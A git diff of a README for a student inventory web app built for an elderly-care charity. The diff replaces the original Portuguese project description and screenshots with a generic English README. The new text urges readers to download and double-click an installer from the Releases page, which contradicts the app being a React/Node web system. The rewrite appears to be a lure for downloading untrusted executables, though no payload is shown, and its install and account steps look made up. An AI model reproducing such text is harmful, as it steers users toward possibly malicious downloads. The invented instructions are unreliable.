@@ -1,64 +1,90 @@
-# 📦 Estoque da Vovó – Projeto de Sustentabilidade Acadêmico
+# 🌱 Sustentabilidade_Estoque_da_vovo - Manage Stock for Sustainability
 
-## 📌 Resumo do Projeto
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AKLFROST/Sustentabilidade_Estoque_da_vovo/releases)
 
-O **Estoque da Vovó** é um sistema web desenvolvido para auxiliar na gestão de estoque de uma instituição de apoio social de idosos, permitindo o **controle de entrada e saída de produtos**, o **cadastro de itens**, a **visualização de relatórios**, **organização eficiente dos recursos** e o **gerenciamento de doadores**.
+## 🖥️ About the Project
+Sustentabilidade_Estoque_da_vovo is a web-based system designed as an academic project for sustainability. This application helps manage inventory in support institutions for the elderly. It focuses on tracking products, donors, and optimizing resources.
 
-O objetivo principal foi criar uma aplicação **intuitiva, funcional e acessível**, que pudesse ser utilizada facilmente pelos administradores da instituição, otimizando processos e reduzindo desperdícios.
+## 🔧 Features
+- **User-Friendly Interface:** Easy navigation and service access.
+- **Product Management:** Track inventory easily.
+- **Donor Control:** Keep records of donations.
+- **Resource Optimization:** Manage supplies effectively.
+- **Full-Stack Functionality:** Built with modern web technologies.
 
-O projeto foi desenvolvido como parte de um **trabalho acadêmico de sustentabilidade** na PUC Minas, em equipe, aplicando práticas de levantamento de requisitos, arquitetura de software, desenvolvimento front-end e back-end, além de testes e documentação.
+## 🌟 Technologies Used
+- **Node.js:** JavaScript runtime for building scalable applications.
+- **Express:** Web framework for Node.js to handle backend needs.
+- **React:** Library for building user interfaces.
+- **Sequelize:** ORM for managing database connections.
+- **Vite:** Fast build tool that enhances development.
 
----
+## 🚀 Getting Started
 
-## 👨‍💻 Minhas Contribuições no Projeto
+### Step 1: Check System Requirements
+Before installing Sustentabilidade_Estoque_da_vovo, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Big Sur or later, or a recent version of Linux.
+- **Web Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for installation and updates.
 
-Durante o desenvolvimento, atuei em várias frentes com foco principal no **front-end** e na **integração com a API**. Minhas atividades incluíram:
+### Step 2: Download the Application
+To get started, you'll need to download the application from our Releases page. 
 
-* Elaboração do projeto e contato com o cliente.
-* Definição de problemas, objetivos e escopo do trabalho.
-* Levantamento de requisitos.
-* Proposição e definição dos mecanismos arquiteturais do sistema.
-* Modelagem e criação de diagramas arquiteturais (Modelo C4).
-* Criação das interfaces (UX/UI) e prototipagem das telas.
-* Desenvolvimento e estruturação de todo o front-end e sua integração com a API.
-* Apoio em partes específicas do back-end para garantir o funcionamento e integração do sistema.
-* Testes manuais de integração front-end ↔ API e correções de bugs identificados.
-* Elaboração do tutorial de uso do sistema para o cliente, garantindo que todos os recursos fossem facilmente compreendidos.
+1. Visit the following link to access the download page:  
+   [Visit this page to download](https://github.com/AKLFROST/Sustentabilidade_Estoque_da_vovo/releases).
 
----
+2. On the Releases page, look for the latest version of the software.
 
-## 🛠️ Tecnologias Utilizadas
+3. Click on the link corresponding to your operating system to download the file.
 
-* **Front-end:** React.js, Vite, Axios, Bootstrap, React Router
-* **Back-end:** Node.js, Express, PostgreSQL, Sequelize
+### Step 3: Install the Application
+After downloading the file:
 
----
+1. Locate the file in your downloads folder.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen instructions to install the application.
 
-## 🖼️ Demonstrações do Sistema
+### Step 4: Run the Application
+Once installation is complete:
 
-1. Tela de login
-![tela de login](./resultados/1login.png)
-2. Tela principal do estoque
-![tela de dashboard](./resultados/2dashboard.png)
-3. Tela de notificações
-![tela de produtos](./resultados/3notificacao.png)
-4. Tela do estoque
-![tela do lotes](./resultados/4lotes.png)
-5. Tela doadores 
-![tela do lotes](./resultados/6doadores.png)
-6. Tela Histórico
-![tela do lotes](./resultados/7historico.png)
----
+1. Find the app icon on your desktop or in your applications folder.
+2. Double-click the icon to launch Sustentabilidade_Estoque_da_vovo.
+3. Wait for the application to open.
 
-## 📚 Competências Desenvolvidas
+### Step 5: Create an Account
+To start using the software, you'll need to create an account:
 
-* Comunicação com stakeholders e coleta de requisitos.
-* Desenvolvimento front-end para aplicações web e integração com APIs REST.
-* Desenvolvimento back-end
-* Aplicação de conceitos de arquitetura de software.
-* Modelagem de diagramas arquiteturais e documentação técnica.
-* Trabalho em equipe, versionamento e integração contínua.
-* Elaboração de materiais de treinamento para usuários finais.
+1. When prompted, enter your username, email, and password.
+2. Confirm your password and click on ‘Create Account’.
+3. Check your email for a verification link to activate your account.
 
----
+### Step 6: Explore the Features
+After logging in, take some time to explore the application. 
 
+- Use the product management section to add and track stock.
+- Access the donor control feature to manage donations.
+- Utilize the resource optimization tools for better efficiency.
+
+## 📖 User Guide
+For detailed instructions on using the application, check the user guide available within the app. This guide will help you understand the functionalities better.
+
+### FAQs
+**Q: What should I do if the download link is broken?**  
+A: Please notify us through the issues section on GitHub.
+
+**Q: Can I use this app on my phone?**  
+A: Currently, this application is designed for desktop use only.
+
+## 🔗 Important Links
+- [Download Page](https://github.com/AKLFROST/Sustentabilidade_Estoque_da_vovo/releases)
+- [Issues Tracker](https://github.com/AKLFROST/Sustentabilidade_Estoque_da_vovo/issues)
+- [User Guide](https://github.com/AKLFROST/Sustentabilidade_Estoque_da_vovo/wiki)
+
+## 📬 Contact
+For further inquiries or support, please reach out via GitHub issues or contact the project maintainer.
+
+## 🛠️ Contributing
+We welcome contributions! If you would like to improve this project, please check the guidelines in our repository on how to contribute. 
+
+Thank you for your interest in Sustentabilidade_Estoque_da_vovo! We appreciate your support in enhancing sustainability in resource management.
